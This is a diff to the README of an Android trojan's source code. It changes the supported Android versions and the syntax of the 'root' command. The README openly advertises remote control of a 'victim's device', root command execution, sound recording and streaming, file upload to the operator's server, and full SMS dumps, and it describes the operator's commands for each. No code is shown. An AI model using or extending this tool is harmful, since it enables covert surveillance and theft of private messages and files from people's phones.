@@ -1,7 +1,7 @@
 # Android Trojan (Built with Android SDK 22) source code
 Android trojan with abilities of remote control,root commands execution, recording and online sound streaming
 
-Compatible with all Android from Froyo (API 8) up to Lollipop (API 22)
+Compatible with all Android from Gingerbread (API 10) up to Lollipop (API 22)
 
 ----DESCRIPTION----
 
@@ -34,7 +34,7 @@ Command :   - execute regular shell command on the victim's device
 Upload file :  - should be filled with full path to the file that will be uploaded to logs/ directory on your server
 
 Spec commands:
-root <command>    -  try to execute command as root (if device is rooted)
+root [command]    -  try to execute command as root (if device is rooted)
 
 sms  - get all sms dump from device
 
